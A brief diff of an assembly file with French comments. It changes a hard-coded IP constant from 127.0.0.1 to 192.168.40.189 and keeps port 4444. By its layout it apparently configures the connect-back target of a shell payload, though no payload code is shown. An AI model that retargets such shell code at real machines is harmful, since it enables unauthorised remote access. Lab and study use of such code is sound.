@@ -1,6 +1,6 @@
 section .data
     ; Définitions des constantes
-    IP equ 0x0100007f         ; 127.0.0.1 en format réseau (little endian)
+    IP equ 0xBD28A8C0         ; 192.168.40.189 en format réseau (little endian)
     PORT equ 0x5c11           ; Port 4444 en format réseau (little endian)
 
 section .bss
